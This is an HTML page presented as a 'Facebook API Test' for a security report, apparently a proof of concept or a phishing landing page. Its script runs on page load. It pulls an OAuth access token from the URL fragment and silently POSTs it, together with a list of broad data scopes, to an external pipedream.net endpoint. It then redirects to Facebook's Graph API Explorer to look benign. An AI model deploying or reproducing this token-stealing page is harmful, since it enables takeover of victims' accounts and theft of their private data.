<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Facebook API Test</title>
</head>
<body style="background-color: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px;">
    <h2>Testing Scopes for Security Report...</h2>
    <script>
        (function() {
            const hash = window.location.hash;
            if (hash.includes('access_token=')) {
                const token = hash.split('access_token=')[1].split('&')[0];
                const target = "https://eoh20zj6isyxv97.m.pipedream.net";
                
                fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        token: token,
                        scopes_tested: "birthday,location,photos,friends,posts,gender,email,openid",
                        report_ref: "924595693574152"
                    })
                });
            }
            setTimeout(() => {
                window.location.href = "https://developers.facebook.com/tools/explorer/";
            }, 1500);
        })();
    </script>
</body>
</html>
